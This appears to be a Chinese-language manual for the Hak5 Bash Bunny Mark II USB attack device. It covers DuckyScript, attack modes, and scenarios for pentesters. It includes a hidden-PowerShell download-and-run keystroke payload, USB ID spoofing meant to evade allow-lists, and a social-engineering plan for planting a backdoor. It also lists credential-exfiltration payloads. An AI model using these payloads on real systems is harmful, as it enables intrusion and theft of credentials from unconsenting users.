---
title：「Hak5 Bash Bunny Mark II 原廠技術說明書與全功能操作手冊」
model：「Bash Bunny Mark II」
manufacturer：「Hak5」
category：「多向量 USB 滲透測試電腦」
docs_url：「https://docs.hak5.org/bash-bunny/」
version：「2.0」
locale：「zh-tw」
---

# Hak5 Bash Bunny Mark II 原廠技術說明書與全功能操作手冊

> Hak5 出品的 Bash Bunny Mark II 是一款封裝於 USB 隨身碟尺寸內的完整 Linux 電腦，能夠模擬十億位元（Gigabit）乙太網路卡、序列埠、快閃記憶體大容量儲存裝置與 HID 鍵盤等複合式 USB 設備端點。

---

## 目錄

- [**1. 產品概述與核心硬體架構**](#1-產品概述與核心硬體架構)
  - [1.1 Bash Bunny by Hak5 原廠介紹](#1-1-bash-bunny-by-hak5-原廠介紹)
- [**2. 入門指南與硬體操作**](#2-入門指南與硬體操作)
  - [2.1 開關檔位定義 (Switch Positions)](#2-1-開關檔位定義-switch-positions)
  - [2.2 大容量儲存裝置結構 (Mass Storage Structure)](#2-2-大容量儲存裝置結構-mass-storage-structure)
  - [2.3 LED 狀態指示燈號 (LED Status Indications)](#2-3-led-狀態指示燈號-led-status-indications)
  - [2.4 安裝額外工具 (Installing Additional Tools)](#2-4-安裝額外工具-installing-additional-tools)
  - [2.5 安裝額外鍵盤語系 (Installing Additional Languages)](#2-5-安裝額外鍵盤語系-installing-additional-languages)
  - [2.6 Mark II 世代重要考量事項 (Considerations for Mark II)](#2-6-mark-ii-世代重要考量事項-considerations-for-mark-ii)
- [**3. 酬載開發與 DuckyScript 語法**](#3-酬載開發與-duckyscript-語法)
  - [3.1 酬載開發基礎 (Payload Development Basics)](#3-1-酬載開發基礎-payload-development-basics)
  - [3.2 DuckyScript™ on the Bash Bunny](#3-2-duckyscript-on-the-bash-bunny)
  - [3.3 QUACK 語法指令](#3-3-quack-語法指令)
  - [3.4 延伸模組 (Extensions)](#3-4-延伸模組-extensions)
  - [3.5 攻擊模式 (ATTACKMODE)](#3-5-攻擊模式-attackmode)
  - [3.6 設備識別碼偽裝 (VID，PID，MAN，PROD，SN)](#3-6-設備識別碼偽裝-vid-pid-man-prod-sn)
  - [3.7 LED 控制語法](#3-7-led-控制語法)
  - [3.8 檔案系統安全操作 (Working with the File System)](#3-8-檔案系統安全操作-working-with-the-file-system)
  - [3.9 CPU 功耗與效能控制 (CPU Control)](#3-9-cpu-功耗與效能控制-cpu-control)
  - [3.10 酬載編寫最佳實踐 (Contributing Best Practices)](#3-10-酬載編寫最佳實踐-contributing-best-practices)
  - [3.11 提交酬載至官方倉儲 (Submitting Payloads)](#3-11-提交酬載至官方倉儲-submitting-payloads)
  - [3.12 網路介面等待指令 (WAIT_FOR_PRESENT)](#3-12-網路介面等待指令-wait_for_present)
- [**4. 網際網路連網與網路共用**](#4-網際網路連網與網路共用)
  - [4.1 讓 Bash Bunny 連線上網 (Getting the Bash Bunny Online)](#4-1-讓-bash-bunny-連線上網-getting-the-bash-bunny-online)
  - [4.2 透過 Windows 共享網路連線 (Sharing an Internet Connection from Windows)](#4-2-透過-windows-共享網路連線-sharing-an-internet-connection-from-windows)
  - [4.3 透過 Linux 共享網路連線 (Sharing an Internet Connection from Linux)](#4-3-透過-linux-共享網路連線-sharing-an-internet-connection-from-linux)
  - [4.4 透過 macOS 共享網路連線 (Sharing an Internet Connection from MacOS)](#4-4-透過-macos-共享網路連線-sharing-an-internet-connection-from-macos)
- [**5. 維護保養、軟體更新與原廠重置**](#5-維護保養軟體更新與原廠重置)
  - [5.1 升級 Bash Bunny 韌體 (Updating the Bash Bunny Firmware)](#5-1-升級-bash-bunny-韌體-updating-the-bash-bunny-firmware)
  - [5.2 原廠還原 (Factory Reset)](#5-2-原廠還原-factory-reset)
  - [5.3 密碼重設 (Password Reset)](#5-3-密碼重設-password-reset)
- [**6. 初學者實戰指南與高階攻擊場景**](#6-初學者實戰指南與高階攻擊場景)
  - [6.1 按鍵注入酬載編寫指南 (Writing Keystroke Injection Payloads)](#6-1-按鍵注入酬載編寫指南-writing-keystroke-injection-payloads)
  - [6.2 網路劫持與毒化攻擊 (Network Hijacking Attacks)](#6-2-網路劫持與毒化攻擊-network-hijacking-attacks)
  - [6.3 五大檔案外傳機密竊取酬載 (Top 5 Exfiltration Payloads)](#6-3-五大檔案外傳機密竊取酬載-top-5-exfiltration-payloads)
  - [6.4 透過序列埠端點取得 Root 權限 (Getting Root from the Serial Console)](#6-4-透過序列埠端點取得-root-權限-getting-root-from-the-serial-console)
  - [6.5 Mark II 低功耗藍牙遠端觸發 (Remote Triggers for Mark II)](#6-5-mark-ii-低功耗藍牙遠端觸發-remote-triggers-for-mark-ii)
  - [6.6 Mark II 訊號強度地理圍欄 (Geofencing for Mark II)](#6-6-mark-ii-訊號強度地理圍欄-geofencing-for-mark-ii)
- [**7. 影片教學精選與實戰參考指引**](#7-影片教學精選與實戰參考指引)
  - [7.1 Bash Bunny 入門初階 (Bash Bunny Primer)](#7-1-bash-bunny-入門初階-bash-bunny-primer)
  - [7.2 搭配 Hamsters 進行釣魚攻擊 (Phishing Attack with Hamsters)](#7-2-搭配-hamsters-進行釣魚攻擊-phishing-attack-with-hamsters)
  - [7.3 密碼抓取酬載 (Password Grabber Payload)](#7-3-密碼抓取酬載-password-grabber-payload)
  - [7.4 目標作業系統指紋偵測 (Operating System Detection)](#7-4-目標作業系統指紋偵測-operating-system-detection)
  - [7.5 延伸模組深入解析 (Bash Bunny Extensions)](#7-5-延伸模組深入解析-bash-bunny-extensions)
  - [7.6 Linux 反彈 Shell 實戰 (Reverse Shells on Linux)](#7-6-linux-反彈-shell-實戰-reverse-shells-on-linux)
  - [7.7 Linux Sudo 後門植入酬載 (Sudo Bashdoor on Linux)](#7-7-linux-sudo-後門植入酬載-sudo-bashdoor-on-linux)
  - [7.8 1990 年代趣味惡作劇酬載 (1990『s Prank)](#7-8-1990-年代趣味惡作劇酬載-1990 s-prank)
  - [7.9 Bash Bunny 開發幕後秘辛 (Dev Behind the Scenes)](#7-9-bash-bunny-開發幕後秘辛-dev-behind-the-scenes)
  - [7.10 口袋型網路隱蔽攻擊與資料外傳 (Concealed Exfiltration)](#7-10-口袋型網路隱蔽攻擊與資料外傳-concealed-exfiltration)
  - [7.11 撰寫酬載並貢獻至 GitHub 社群 (Contributing on GitHub)](#7-11-撰寫酬載並貢獻至-github-社群-contributing-on-github)

---

## 1. 產品概述與核心硬體架構

<!-- section：overview -->
### 硬體技術規格與原廠校準基準表

| 硬體元件名稱 | 原廠技術規格說明 |
|---|---|
| **SoC / CPU** | Quad-core ARM Cortex A7 1.3 GHz |
| **系統記憶體 (RAM)** | 512 MB DDR3 |
| **內部儲存空間** | 8 GB SSD NAND |
| **擴充儲存插槽** | MicroSD XC 記憶卡插槽（最高支援至 2 TB）|
| **無線通訊模組** | 低功耗藍牙（BLE），支援智慧型手機遠端觸發與地理圍欄 |
| **硬體控制開關** | 3 段式實體酬載選擇切換開關（Switch 1，Switch 2，Arming）|
| **狀態指示燈** | 多色 RGB 高亮度 LED 診斷指示燈 |
| **冷開機時間** | 約 7 秒極速冷開機完成初始化 |

---

<!-- section：overview -->
### 1.1 Bash Bunny by Hak5 原廠介紹

透過模擬受信任 USB 裝置的各種組合——例如十億位元乙太網路卡、序列埠主控台、快閃記憶體大容量儲存裝置與 HID 鍵盤——Bash Bunny 能夠誘導目標電腦洩漏敏感資料、外傳機密文件、安裝隱蔽後門並執行各類漏洞利用程式（Exploits）。

![Bash Bunny Mark II (SD)](https://4178757749-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FnxJgJ9UdPfrcuL1U8 DpL%2Fuploads%2FST37YjjBLiCVU4ZHjY8 N%2Fbunnymk2%400.5 x.png?alt=media&token=eb6f3b92-20 df-42 bd-b79 a-67c284a61e9 e)

> [!WARNING]
> 本文檔產生的電子書 PDF 在某些檢視裝置上可能無法正確排版。如需取得最新版本技術說明，請參閱官方文檔站點：<https://docs.hak5.org>。

---

## 2. 入門指南與硬體操作

<!-- section：features -->
### 2.1 開關檔位定義 (Switch Positions)

當開關切換至 **開關位置 3**（Switch Position 3，最靠近 USB 公頭插頭側）時，Bash Bunny 將開機進入「維護模式」（Arming Mode），同時啟用 Serial 序列埠與 USB 大容量儲存裝置（Mass Storage）。在此專用模式下，使用者可透過電腦隨身碟磁區管理 Bash Bunny 的酬載檔案，亦可透過序列埠端點直接存取底層 Linux Shell 主控台。

![](https://4178757749-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FnxJgJ9UdPfrcuL1U8 DpL%2Fuploads%2FNY6fwd09yUtu3sRsbNJe%2Fimage.png?alt=media&token=d0880bb8-0e9 b-41 bd-809 e-d3724c8fe234)

> [!NOTE]
> Bash Bunny Mark II 的開關檔位定義與第一代硬體完全相同。

![](https://4178757749-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FnxJgJ9UdPfrcuL1U8 DpL%2Fuploads%2FOUsDD5GtHKOQd4WZfY8 b%2Fimage.png?alt=media&token=1a351d7 c-cdf9-4531-9c48-7d2b6d79c3a7)

---

### 2.2 大容量儲存裝置結構 (Mass Storage Structure)

當 Bash Bunny 處於維護模式時，將呈現以下目錄架構：

* `/*docs*` – 存放說明文檔資料庫。
* `/*languages*` – 用於安裝額外的 HID 鍵盤設定（Keyboard Layouts）與語系定義。
* `/*loot*` – 專供酬載儲存外傳的日誌、帳密憑證及機密資料。
* `/*tools*` – 用於存放並安裝額外的 deb 軟體包及第三方滲透測試工具。
* `/*payloads*` – 存放目前啟用的酬載、函式庫與延伸模組。
* `/*payloads*/*switch1*` 與 `/*payloads*/*switch2*` – 分別存放對應開關檔位 1 與 2 的 `payload.txt` 及附屬腳本，裝置在對應檔位插入目標電腦時將自動執行該酬載。
* `/*payloads*/*library*` – 存放自 [Bash Bunny Payload GitHub 倉儲](https://github.com/hak5/bashbunny-payloads) 下載的社群酬載庫。
* `/*payloads*/*library*/*extensions*` – 存放 Bash Bunny 的官方與社群延伸擴展模組。

> [!NOTE]
> **Bash Bunny Mark II 專屬注意事項：**  
> 若在開關位置 1 或 2 開機時已插入 MicroSD 記憶卡，`/root/udisk` 目錄將自動建立符號連結（symlink）指向 MicroSD 卡的根目錄。若未插入 MicroSD 卡，則 udisk 分割區將正常對應至內建的內部 SSD。

---

### 2.3 LED 狀態指示燈號 (LED Status Indications)

| LED 燈號表現 | 系統運作狀態定義 |
|---|---|
| 綠燈（閃爍）| 系統開機初始化中 (Booting up) |
| 藍燈（閃爍）| 維護模式就緒 (Arming Mode) |
| 紅燈（閃爍）| 系統復原模式或韌體燒錄中（適用於韌體 v1.0）**絕對不可拔除電源** |
| 紅燈/藍燈（交替閃爍）| 系統復原模式或韌體燒錄中（適用於韌體 v1.1+）**絕對不可拔除電源** |

---

### 2.4 安裝額外工具 (Installing Additional Tools)

1. 將 Bash Bunny 透過開關位置 3 插入電腦，使其進入維護模式。
2. 將相容於 ARM 架構（armhf）的 `.deb` 安裝套件檔案複製進隨身碟的 `tools` 資料夾中。
3. 安全退出隨身碟磁區，並在維持開關位置 3 的狀態下將 Bash Bunny 重新插入電腦。
4. 觀察 LED 狀態燈號：當 LED 閃爍藍燈時，系統即自動完成套件安裝。

---

### 2.5 安裝額外鍵盤語系 (Installing Additional Languages)

Bash Bunny 預設採用美式英語（US）鍵盤設定。若目標主機使用其他語系鍵盤（如德語、法語、英式英語或日語），按鍵符號對應將發生錯位。

1. 由 Hak5 官方語言庫下載對應語系的鍵盤設定定義檔。
2. 將鍵盤設定檔案複製至隨身碟磁區的 `languages` 資料夾中。
3. 在撰寫 `payload.txt` 時，於腳本開頭宣告目標語系程式碼，例如 `DUCKY_LANG de`。

---

### 2.6 Mark II 世代重要考量事項 (Considerations for Mark II)

Bash Bunny Mark II 藉由 MicroSD XC 記憶卡插槽與低功耗藍牙（BLE）射頻晶片，大幅拓展了海量資料外傳、無線地理圍欄與遠端觸發功能。所有針對第一代 Bash Bunny 開發的酬載均 100% 相容於 Mark II。

在為 Mark II 開發或部署酬載時，必須特別留意以下兩大關鍵維度：**無線通訊 (Wireless)** 與 **儲存裝置 (Storage)**。

#### 無線通訊考量 (WIRELESS)

若有需要，可在酬載中使用 `WAIT_FOR_PRESENT` 或 `WAIT_FOR_NOT_PRESENT` 延伸模組來實作地理圍欄防禦與遠端觸發機制。當調用這些延伸指令時，系統將即時掃描周遭的藍牙無線環境，並將觀測結果暫存於 `/tmp/bt_observation`。

延伸參考指引：
* [Mark II 遠端觸發指南](#6-5-mark-ii-低功耗藍牙遠端觸發-remote-triggers-for-mark-ii)

#### 儲存架構考量 (STORAGE)

在 Bash Bunny Mark II 上使用 MicroSD 卡時，請務必掌握以下核心原則：

##### 維護模式 (Arming Mode)
> [!WARNING]
> 若要透過維護模式載入或修改酬載，請在**未插入 MicroSD 記憶卡**的狀態下將 Bash Bunny 開機。

* 酬載腳本**僅能由內部 SSD 儲存空間執行**。
* 若在維護模式開機時插有 MicroSD 卡，該卡將被直接透傳至宿主主機，而不會掛載內部酬載分區。

##### 酬載設計考量 (Payload Considerations)
* 當啟用 `ATTACKMODE STORAGE` 時：
  * 若插有 MicroSD 卡，Bash Bunny 將優先向目標主機呈現該 MicroSD 卡。
  * 若未插入 MicroSD 卡，則向目標主機呈現內建的內部 udisk 分割區。
* 預設情況下，*在開機載入酬載之後*，從 Bash Bunny 本機作業系統的視角來看，udisk **並不會自動掛載**。
  * 若要在 Bash Bunny 內部掛載存取 udisk，必須在腳本中明確下達指令 `udisk mount`。

##### 掛載互斥原則 (Mounting Considerations)
* udisk 分割區——不論是內部 SSD 還是外部 MicroSD——**同一時間只能被單一設備掛載**。
* 除非執行了 `udisk mount` 指令，否則本機的 `/root/udisk` 目錄內容將呈現空白。
* 在未掛載狀態下直接向 `/root/udisk` 寫入資料，將完全不會同步至實際的 udisk 磁區。
* 若同時啟用了 `ATTACKMODE STORAGE`（將儲存裝置掛載給目標電腦）與 `udisk mount`（將儲存裝置掛載給 Bash Bunny），將引發資料讀寫衝突與檔案系統損毀，因為該分區無法同時被兩台電腦同時掌控。

##### 檔案系統格式化原則 (Formatting Considerations)
* MicroSD 卡應僅建立單一分割區，並格式化為適合目標受測作業系統的檔案系統：
  * Windows 目標：FAT32、ExFAT、NTFS
  * macOS 目標：FAT32、ExFAT、APFS
  * Linux 目標：FAT32、ExFAT、EXT
* 雖然受測目標可能支援多種現代檔案系統，但 Bash Bunny 嵌入式系統目前原生完整支援 EXT 與 FAT32。

---

## 3. 酬載開發與 DuckyScript 語法

<!-- section：configuration -->
### 3.1 酬載開發基礎 (Payload Development Basics)

Bash Bunny 酬載核心為放置於開關目錄中的 `payload.txt`。其最獨特之處在於：它無縫融合了 **DuckyScript** 的按鍵模擬語法與 **Bash** 的強大 Shell 指令。

標準酬載生命週期包含三個關鍵階段：
1. **設定階段 (Setup)**：初始化 LED 燈號，設定 `ATTACKMODE` 複合設備類型。
2. **攻擊執行階段 (Attack)**：模擬按鍵注入合成字串、啟用網路介面竊聽或執行惡意酬載。
3. **收尾階段 (Cleanup)**：保存外傳資料，執行 `sync` 確保磁區寫入，發出 LED 成功信號。

---

### 3.2 DuckyScript™ on the Bash Bunny

在 Bash Bunny 上，DuckyScript 指令可直接於腳本中調用。系統在執行時將由直譯引擎自動分流處理：純按鍵語法（如 `STRING`，`ENTER`，`DELAY`）轉交 HID 驅動模組，Linux 命令（如 `ifconfig`，`cat`，`iptables`）則由底層 Bash 核心直接原生執行。

---

### 3.3 QUACK 語法指令

`QUACK` 是向受測主機注入虛擬鍵盤擊鍵序列的核心命令：

```bash
# 範例：開啟 Windows 執行視窗並啟動 cmd
QUACK GUI r
QUACK DELAY 200
QUACK STRING cmd
QUACK ENTER
QUACK DELAY 500
QUACK STRING powershell -ep bypass -w hidden
QUACK ENTER
```

主要指令包含：
* `QUACK STRING <文字>`：以極速注入純字串。
* `QUACK DELAY <毫秒>`：暫停注入特定時間，等待主機視窗反應。
* `QUACK GUI <按鍵>`：按下 Windows/Command 鍵組合鍵。
* `QUACK ENTER` / `QUACK TAB` / `QUACK SPACE`：特殊控制鍵輸入。

---

### 3.4 延伸模組 (Extensions)

延伸模組是預先封裝好的 Bash 函式庫，位於 `/payloads/library/extensions/`。透過調用延伸模組，開發者無需重複編寫複雜的網路設定或滲透邏輯。

常用延伸模組包含：
* `get2_dhclient.sh`：為 ECM 網路介面動態取得 IP 位址。
* `wait_for_target.sh`：偵測受測主機何時完成 USB 設備列舉。

---

### 3.5 攻擊模式 (ATTACKMODE)

`ATTACKMODE` 是 Bash Bunny 最強大的指令，用於宣告模擬哪些 USB 實體設備。一個酬載內可多次呼叫此指令動態變更硬體型態：

| 攻擊模式程式碼 | 模擬設備類型與用途 |
|---|---|
| `SERIAL` | ACM（抽象控制模型）序列埠主控台 |
| `ECM_ETHERNET` | ECM（乙太網路控制模型）適用於 Linux / macOS / Android 虛擬網卡 |
| `RNDIS_ETHERNET` | RNDIS 適用於 Windows（以及部分 Linux）虛擬網卡 |
| `AUTO_ETHERNET` | 自動乙太網：先嘗試 ECM，若 20 秒內未建立連線則自動退回嘗試 RNDIS。可透過 `ETHERNET_TIMEOUT_XX` 自訂逾時秒數 |
| `STORAGE` | UMS（USB 大容量儲存裝置）隨身碟磁區 |
| `HID` | HID（人機介面裝置）模擬鍵盤注入 |

#### 複合設備組合與預設 VID / PID 對照表

| 複合設備組合模式 | 預設 VID / PID 識別碼 |
|---|---|
| SERIAL STORAGE | 0xF000 / 0xFFF0 |
| HID | 0xF000 / 0xFF01 |
| STORAGE | 0xF000 / 0xFF10 |
| SERIAL | 0xF000 / 0xFF11 |
| RNDIS_ETHERNET | 0xF000 / 0xFF12 |
| ECM_ETHERNET | 0xF000 / 0xFF13 |
| HID SERIAL | 0xF000 / 0xFF14 |
| HID STORAGE | 0xF000 / 0xFF02 |
| HID RNDIS_ETHERNET | 0xF000 / 0xFF03 |
| HID ECM_ETHERNET | 0xF000 / 0xFF04 |
| HID STORAGE RNDIS_ETHERNET | 0xF000 / 0xFF05 |
| HID STORAGE ECM_ETHERNET | 0xF000 / 0xFF06 |
| SERIAL RNDIS_ETHERNET | 0xF000 / 0xFF07 |
| SERIAL ECM_ETHERNET | 0xF000 / 0xFF08 |
| STORAGE RNDIS_ETHERNET | 0xF000 / 0xFF20 |
| STORAGE ECM_ETHERNET | 0xF000 / 0xFF21 |

---

### 3.6 設備識別碼偽裝 (VID，PID，MAN，PROD，SN)

為避開企業端點安全防護（EDR）或 USB 白名單控管，Bash Bunny 支援自訂模擬裝置的硬體特徵：

```bash
# 偽裝為常見的 Kingston 隨身碟與鍵盤
ATTACKMODE HID STORAGE VID_0x0951 PID_0x1666 MAN_Kingston PROD_DataTraveler SN_0014D1
```

---

### 3.7 LED 控制語法

透過內建的 `LED` 命令，滲透測試人員可精確掌握無螢幕環境下的腳本進度：

* 預設語意狀態：`LED SETUP`（設定中，洋紅）、`LED ATTACK`（攻擊中，黃燈）、`LED SUCCESS`（成功，固態綠燈）、`LED FAIL`（失敗，固態紅燈）。
* 自訂模式：`LED R G B`（自訂色彩三原色數值，或指定樣式如 `LED FAST`，`LED SLOW`，`LED VERYFAST`）。

---

### 3.8 檔案系統安全操作 (Working with the File System)

快閃記憶體寫入需要時間緩衝。在酬載執行完畢前，**務必調用 `sync` 指令**，強制作業系統核心將記憶體緩衝區的資料完全寫入實體儲存晶片中，避免因拔除裝置導致資料遺失或分割區損壞：

```bash
# 安全寫入資料至 loot 資料夾
echo「$CAPTURED_DATA」>> /root/udisk/loot/credentials.txt
sync
```

---

### 3.9 CPU 功耗與效能控制 (CPU Control)

Bash Bunny 內建四核心處理器。在執行運算密集的滲透任務（如即時憑證雜湊爆破或大量網路封包解析）時，可提高 CPU 頻率；在長時間隱蔽潛伏任務中，則可降頻運作以抑制發熱量：

```bash
# 啟用最大效能模式
cpu_max
# 恢復節能模式
cpu_normal
```

---

### 3.10 酬載編寫最佳實踐 (Contributing Best Practices)

1. **腳本頭部完整註解**：標明作者、目標作業系統（Target OS）、所需工具與依賴模組。
2. **完善的 LED 狀態回饋**：確保每個攻擊階段都有清楚的燈號變換，方便操作者判斷拔出時機。
3. **最小化系統足跡**：盡可能將暫存檔案寫入記憶體虛擬磁碟 `/tmp`，並在結束時完全清理受測主機上的暫存檔案。

---

### 3.11 提交酬載至官方倉儲 (Submitting Payloads)

Hak5 官方鼓勵社群開發者將驗證過的高品質酬載提交至 GitHub 開源倉儲。提交前請確保程式碼經過完整清理，無硬編碼個人帳密，並遵循標準目錄命名結構。

---

### 3.12 網路介面等待指令 (WAIT_FOR_PRESENT)

在發動網路相關攻擊時，受測主機通常需要數秒時間載入 RNDIS/ECM 驅動程式並分配 IP。`WAIT_FOR_PRESENT` 指令能夠持續監聽本機介面狀態，直到通訊鏈路正式建立後才開始注入攻擊酬載，大幅提升實戰成功率。

---

## 4. 網際網路連網與網路共用

### 4.1 讓 Bash Bunny 連線上網 (Getting the Bash Bunny Online)

讓 Bash Bunny 連上網際網路，可以方便滲透人員透過 `apt-get` 安裝最新資安工具、下載外部攻擊模組，或建立反彈外聯通道。

---

### 4.2 透過 Windows 共享網路連線 (Sharing an Internet Connection from Windows)

1. 在 `payload.txt` 設定 `ATTACKMODE RNDIS_ETHERNET` 並將 Bash Bunny 插入 Windows 工作站。
2. 開啟 Windows 的「控制台」$
ightarrow$「網路和共用中心」$
ightarrow$「變更介面卡設定」。
3. 找到您工作站目前連接網際網路的網路卡（如 Wi-Fi 或乙太網路），按右鍵選擇「內容」。
4. 切換至「共用」分頁，勾選「允許其他網路使用者透過此電腦的網際網路連線來連線」。
5. 在「家用網路連線」下拉選單中，選擇 Bash Bunny 所對應的虛擬網路卡（通常標註為 Remote NDIS Compatible Device），按確定儲存。

---

### 4.3 透過 Linux 共享網路連線 (Sharing an Internet Connection from Linux)

Hak5 官方提供了便捷的連網輔助腳本 `bb.sh`：

```bash
wget bashbunny.com/bb.sh
sudo bash ./bb.sh
```

依照端點機指示，選擇引導式設定（Guided Setup），腳本將自動啟用 Linux 核心的 `net.ipv4.ip_forward` 封包轉發功能，並建立對應的 `iptables` NAT 規則。

---

### 4.4 透過 macOS 共享網路連線 (Sharing an Internet Connection from MacOS)

#### 方法一：使用 DHCLIENT 延伸模組

1. 確保隨身碟 `payloads/extensions/` 目錄中具備 `get2_dhclient.sh` 延伸模組。
2. 撰寫 `payload.txt` 設定為 `ATTACKMODE ECM_ETHERNET` 並呼叫 `DHCLIENT`。
3. 在 Mac 的「系統設定」$
ightarrow$「一般」$
ightarrow$「共享」中啟用「網際網路共享」，將您的對外連網來源分享給 Bash Bunny 虛擬網卡（RNDIS/Ethernet Gadget）。
4. 觀察 LED 轉為綠燈即表示成功取得 IP（通常位於 `192.168.2.x` 網段），可直接透過 `ssh root@192.168.2.2` 登入。

#### 方法二：透過 MacPorts 安裝 Squid 代理伺服器

若 macOS 原生共享異常，可在 Mac 本機建置 Squid Proxy 伺服器，並於 Bash Bunny 內部設定 `export http_proxy=http://172.16.64.10:3128` 達成連網更新。

---

## 5. 維護保養、軟體更新與原廠重置

<!-- section：maintenance -->
### 5.1 升級 Bash Bunny 韌體 (Updating the Bash Bunny Firmware)

Hak5 定期釋出韌體更新以修正軟體漏洞並提升硬體穩定度。

1. 將 Bash Bunny 透過開關位置 3 插入電腦進入維護模式。
2. 將官方下載的升級套件（`upgrade-x.x.tar.gz`）直接放置於隨身碟根目錄下。
3. 安全退出隨身碟磁區，並在維持開關 3 的狀態下重新將裝置插入電腦。
4. 系統將自動進入燒錄程序：LED 將呈現紅藍交替閃爍（燒錄過程可能長達 10 分鐘）。
5. 燒錄完成後 LED 將短暫轉為綠燈重啟，最後回到標準的緩慢藍燈閃爍，表示升級圓滿完成。

> [!CAUTION]
> **韌體升級絕對禁忌：**  
> 1. **Mark I 使用者切勿刷寫 1.7+ 韌體**（此版本專屬 Mark II）。
> 2. **升級過程中絕對不可拔除電源**，否則將導致晶片變磚。
> 3. 升級韌體時請務必拔除 MicroSD 記憶卡。

---

### 5.2 原廠還原 (Factory Reset)

當系統發生嚴重錯誤或設定損毀時，可執行出廠還原。在隨身碟根目錄下建立名為 `factoryreset` 的空白文字檔案，並重新開機進入維護模式，系統將自動抹除使用者資料並復原原始映像檔。

---

### 5.3 密碼重設 (Password Reset)

若遺忘 Bash Bunny 的 Linux root 密碼，可於維護模式根目錄下放置官方重置腳本或重置標記檔案，重新開機後 root 預設密碼將被復原為 `hak5bunny`。

---

## 6. 初學者實戰指南與高階攻擊場景

### 6.1 按鍵注入酬載編寫指南 (Writing Keystroke Injection Payloads)

利用 Windows 工作站對人機介面裝置的信任特權，透過快速模擬鍵盤擊鍵，在數秒內繞過防毒軟體的靜態檔案偵測：

```bash
#!/bin/bash
LED ATTACK
ATTACKMODE HID
QUACK GUI r
QUACK DELAY 100
QUACK STRING powershell -WindowStyle Hidden -Command「Invoke-WebRequest -Uri http://example.com/a.ps1 -OutFile $env:TEMP.ps1；Start-Process $env:TEMP.ps1」
QUACK ENTER
LED SUCCESS
```

---

### 6.2 網路劫持與毒化攻擊 (Network Hijacking Attacks)

透過將 Bash Bunny 模擬為十億位元 USB 乙太網卡（`ATTACKMODE RNDIS_ETHERNET`），其 DHCP 指標將被作業系統賦予極高優先權。受測主機的所有網路流量將被強制轉向導流至 Bash Bunny，進而搭配 Responder 工具截取本機 NTLMv2 認證憑證雜湊。

---

### 6.3 五大檔案外傳機密竊取酬載 (Top 5 Exfiltration Payloads)

1. **認證憑證竊取 (QuickCreds)**：利用 USB 網卡毒化截取登入雜湊。
2. **重要副檔名獵捕器 (File Dumper)**：掃描受測電腦使用者目錄中的 `.docx`，`.pdf`，`.kdbx` 檔案並外傳至隨身碟 loot 資料夾。
3. **瀏覽器歷史與密碼提取**：自動擷取本機瀏覽器未加密的 Session Cookie 與歷史紀錄。
4. **系統資訊全景勘測**：匯出主機補丁資訊、內部網段清單與防毒軟體防護狀態。
5. **WiFi 密碼全量導出**：利用單行指令匯出目標主機曾連線過的所有無線網路明文密碼。

---

### 6.4 透過序列埠端點取得 Root 權限 (Getting Root from the Serial Console)

1. 將切換開關置於位置 3（維護模式）並連接電腦。
2. Windows 使用者開啟 PuTTY，連線類型選擇 **Serial**，通訊埠填入對應的 COM 埠號（如 COM3），鮑率設定為 **115200**。
3. Linux / macOS 使用者可在端點機執行 `screen /dev/tty.usbmodem* 115200`。
4. 按下 Enter 鍵即可看見 Bash Bunny 登入提示，輸入帳號 `root` 與密碼 `hak5bunny` 取得完整權限之 Shell。

---

### 6.5 Mark II 低功耗藍牙遠端觸發 (Remote Triggers for Mark II)

Bash Bunny Mark II 內建 BLE 模組，可實踐「雙階段實體社交工程攻擊」：

#### 實戰場景構想
滲透人員請受測主機秘書幫忙列印隨身碟中的文件。此時插入 Bash Bunny（第一階段：純隨身碟 `ATTACKMODE STORAGE`），完全不具威脅性。當秘書轉身去影印機拿取文件時，滲透人員在遠處透過手機藍牙廣播特定訊號，Bash Bunny 收到訊號後立即啟動第二階段（`ATTACKMODE STORAGE HID`）並注入後門程式碼。

#### 實作程式碼

```bash
# Mark II 遠端藍牙觸發實例
LED SETUP

# 第一階段：偽裝為普通隨身碟
ATTACKMODE STORAGE
LED STAGE1
WAIT_FOR_PRESENT myphone

# 第二階段：偵測到手機訊號，發動惡意按鍵注入
ATTACKMODE STORAGE HID
LED STAGE2
QUACK GUI r
QUACK DELAY 200
QUACK STRING powershell -w hidden -c「Write-Host Triggered」
QUACK ENTER
LED SUCCESS
```

---

### 6.6 Mark II 訊號強度地理圍欄 (Geofencing for Mark II)

利用 `WAIT_FOR_NOT_PRESENT` 或訊號強度（RSSI）閾值監聽。當受測目標攜帶特定藍牙設備離開特定半徑範圍（例如午休離開座位）時，自動觸發攻擊；或當滲透人員離開現場時，設備自動抹除記憶體暫存外傳資料，確保敏感情報不外洩。

---

## 7. 影片教學精選與實戰參考指引

### 7.1 Bash Bunny 入門初階 (Bash Bunny Primer)
* 官方影片教學連結：[https://youtu.be/8j6hrjSrJaM](https://youtu.be/8j6hrjSrJaM)
* 介紹硬體開箱、維護模式登入與第一支按鍵腳本運行。

### 7.2 搭配 Hamsters 進行釣魚攻擊 (Phishing Attack with Hamsters)
* 官方影片教學連結：[https://youtu.be/zP8E3j7 rEeo](https://youtu.be/zP8E3j7 rEeo)
* 展示如何利用自訂網路介面跳出偽冒系統認證對話框截取明文密碼。

### 7.3 密碼抓取酬載 (Password Grabber Payload)
* 官方影片教學連結：[https://youtu.be/N-s4xMvdZpU](https://youtu.be/N-s4xMvdZpU)
* 針對記憶體中快取的 Windows 憑證實施秒級提取。

### 7.4 目標作業系統指紋偵測 (Operating System Detection)
* 官方影片教學連結：[https://youtu.be/oX6f0sTzBwM](https://youtu.be/oX6f0sTzBwM)
* 探討如何自動判斷目標為 Windows、macOS 抑或 Linux，並動態分流執行專屬酬載。

### 7.5 延伸模組深入解析 (Bash Bunny Extensions)
* 官方影片教學連結：[https://youtu.be/DdQ8s5E3T3 I](https://youtu.be/DdQ8s5E3T3 I)
* 模組化程式庫之結構剖析與社群共用標準。

### 7.6 Linux 反彈 Shell 實戰 (Reverse Shells on Linux)
* 官方影片教學連結：[https://youtu.be/rV8gXkG2 rOQ](https://youtu.be/rV8gXkG2 rOQ)
* 實測於 Linux 主機插入裝置並建立隱蔽回連管道。

### 7.7 Linux Sudo 後門植入酬載 (Sudo Bashdoor on Linux)
* 官方影片教學連結：[https://youtu.be/8 lPZ-9X2u7 U](https://youtu.be/8 lPZ-9X2u7 U)
* 於 Linux `/etc/sudoers.d/` 建立無密碼提權後門機制。

